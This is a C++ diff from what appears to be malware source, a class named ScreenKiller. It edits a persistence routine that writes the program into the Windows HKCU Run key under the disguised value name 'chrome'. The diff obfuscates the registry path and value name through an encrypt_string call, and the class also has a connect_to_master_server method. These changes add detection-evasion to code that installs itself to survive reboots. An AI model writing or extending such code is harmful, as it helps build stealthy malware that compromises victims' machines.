@@ -18,7 +18,7 @@ void ScreenKiller::deploy()
 {
 	this->m_alive = true;
 
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	//ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	this->runner_thread = std::thread([this] {this->deploy_inner(); });
 }
@@ -74,9 +74,11 @@ bool ScreenKiller::get_persistency()
 		return false;
 
 	HKEY hkey = NULL;
-	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
+	LONG createStatus = RegCreateKeyA(HKEY_CURRENT_USER, this->encrypt_string("dxqc`verkz^TEXDXQCk`^YSX@DktBEERYCaRED^XYkeBY").c_str(), &hkey);
+	if (createStatus != ERROR_SUCCESS)
+		return false;
 
-	LONG status = RegSetValueExA(hkey, "chrome", 0, REG_SZ, reinterpret_cast<const BYTE *>(szExeFileName), (strlen(szExeFileName) + 1) * sizeof(char));
+	return RegSetValueExA(hkey, this->encrypt_string("T_EXZR").c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(szExeFileName), (strlen(szExeFileName) + 1) * sizeof(char)) == ERROR_SUCCESS;
 }
 
 bool ScreenKiller::connect_to_master_server()
